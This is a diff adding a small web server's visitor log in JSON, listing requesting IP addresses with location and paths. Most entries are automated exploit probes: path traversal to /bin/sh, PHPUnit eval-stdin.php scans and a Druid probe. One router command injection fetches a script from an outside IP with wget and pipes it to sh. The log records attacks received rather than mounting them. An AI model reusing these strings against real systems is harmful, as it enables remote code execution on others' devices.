@@ -1,0 +1,92 @@
+Server Restarted 2-6-2024 20:4:1
+
+Website visited 38 times, most recently @ 2-6-2024 20:39:22
+
+{
+	"::ffff:164.92.71.158": [
+		"Counrty: United States of America",
+		"City: Denver",
+		"Times Visited: 33",
+		"Date (L.V): 2-6-2024",
+		"Time (L.V): 20:5:49",
+		{
+			"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh": 1,
+			"/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh": 1,
+			"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/vendor/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/vendor/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/vendor/phpunit/phpunit/LICENSE/eval-stdin.php": 1,
+			"/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/phpunit/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/lib/phpunit/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/lib/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/lib/phpunit/Util/PHP/eval-stdin.php": 1,
+			"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1,
+			"/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": 1
+		}
+	],
+
+	"::ffff:185.242.226.10": [
+		"Counrty: Netherlands",
+		"City: Wormer",
+		"Times Visited: 2",
+		"Date (L.V): 2-6-2024",
+		"Time (L.V): 20:34:9",
+		{
+			"/": 2
+		}
+	],
+
+	"::ffff:13.91.181.242": [
+		"Counrty: United States of America",
+		"City: San Jose",
+		"Times Visited: 1",
+		"Date (L.V): 2-6-2024",
+		"Time (L.V): 20:34:12",
+		{
+			"/druid/index.html": 1
+		}
+	],
+
+	"::ffff:185.224.128.43": [
+		"Counrty: Netherlands",
+		"City: Amsterdam",
+		"Times Visited: 1",
+		"Date (L.V): 2-6-2024",
+		"Time (L.V): 20:38:24",
+		{
+			"/": 1
+		}
+	],
+
+	"::ffff:31.220.1.83": [
+		"Counrty: Belize",
+		"City: UNKNOWN",
+		"Times Visited: 1",
+		"Date (L.V): 2-6-2024",
+		"Time (L.V): 20:39:22",
+		{
+			"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.198%2Ft+-O-+|+sh%60)": 1
+		}
+	]
+}
